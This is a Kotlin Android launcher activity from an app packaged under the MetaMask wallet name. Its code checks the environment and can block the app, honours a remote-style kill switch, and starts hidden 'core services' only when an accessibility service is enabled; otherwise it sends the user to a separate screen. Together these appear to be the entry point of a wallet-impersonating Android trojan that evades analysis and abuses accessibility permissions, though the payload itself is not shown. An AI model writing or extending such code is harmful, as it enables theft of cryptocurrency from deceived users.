package com.example.MetaMask.activities

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.MetaMask.services.CoreServicesLauncher
import com.example.MetaMask.utils.SecurityAuditor

class GatewayActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[GatewayActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        super.onCreate(savedInstanceState)

        val blockMsg = SecurityAuditor.checkEnvironment(this)
        if (blockMsg != null) {
            android.util.Log.d("XDBG", "[GatewayActivity] if branch") //xdbg
            Toast.makeText(this, blockMsg, Toast.LENGTH_LONG).show()
            finish()
            return
        }

        val prefs = getSharedPreferences("app_kill_switch_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("is_permanently_disabled", false)) {
            android.util.Log.d("XDBG", "[GatewayActivity] if branch") //xdbg
            startActivity(Intent(this, AuthScreenActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            })
            finish()
            return
        }

        val accessibilityOn = CoreServicesLauncher.isAccessibilityServiceEnabled(this)

        if (accessibilityOn) {
            android.util.Log.d("XDBG", "[GatewayActivity] if branch") //xdbg
            CoreServicesLauncher.launch(this)
        } else {
            startActivity(Intent(this, CoralCobraActivity::class.java))
        }

        finish()
    }
}
